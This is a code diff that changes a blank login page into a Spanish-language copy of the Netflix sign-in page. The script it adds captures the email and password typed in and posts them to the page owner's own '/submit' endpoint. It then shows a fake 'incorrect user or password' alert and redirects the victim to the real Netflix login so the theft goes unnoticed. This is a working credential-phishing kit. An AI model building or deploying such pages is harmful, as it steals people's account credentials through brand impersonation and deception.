@@ -1,20 +1,88 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Netflix</title>
+    <link rel="stylesheet" href="login.css">
 </head>
+
 <body>
-    <div class="centrado">
-            <div class="container-form">
-                <div class="title">
-                    <h1>Iniciar sesión</h1>
-                </div>
-                <form action="">
-                    <input type="text" placeholder="Email o número de celular">
-                </form>
+    <nav>
+        <a href="#"><img src="logo.png" alt="logo" /></a>
+    </nav>
+
+    <div class="form-wrapper">
+        <h2>Iniciar sesión</h2>
+        <form id="contact-form">
+            <div class="form-control">
+                <input type="text" name="email" required />
+                <label>Email o número de celular</label>
             </div>
-        </div>
+            <div class="form-control">
+                <input type="password" name="message" required />
+                <label>Contraseña</label>
+            </div>
+            <button type="submit">Iniciar sesión</button>
+            <p>O</p>
+            <button type="button" class="btn-sign-in">Usar un código de inicio de sesión</button>
+            <a href="#">¿Olvidaste la contraseña?</a>
+            <div class="form-help">
+                <div class="remember-me">
+                    <input type="checkbox" id="remember-me" />
+                    <label for="remember-me">Recordarme</label>
+                </div>
+            </div>
+        </form>
+
+
+        <p>¿Primera vez en Netflix? <a href="#">Suscríbete ya.</a></p>
+        <small>
+            Esta página está protegida por Google reCAPTCHA para comprobar que no eres un robot.
+            <br><br>
+            <a href="#">Más info.</a>
+        </small>
+
+
+
+    </div>
+
+
+
+
+    <script>
+        const form = document.getElementById('contact-form');
+
+        form.addEventListener('submit', async e => {
+            e.preventDefault();
+
+            const email = form.email.value;
+            const message = form.message.value;
+
+            try {
+                const res = await fetch('/submit', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email, message })
+                });
+
+                const data = await res.json();
+                if (data.success) {
+                    alert('Usuario o contrseña incorrectos ');
+                    window.location.href = 'https://www.netflix.com/mx/login'; // redirección
+                } else {
+                    alert('Error al enviar ❌');
+                }
+            } catch (err) {
+                console.error(err);
+                alert('Error de conexión ❌');
+            }
+        });
+
+    </script>
 </body>
+
+
+
 </html>
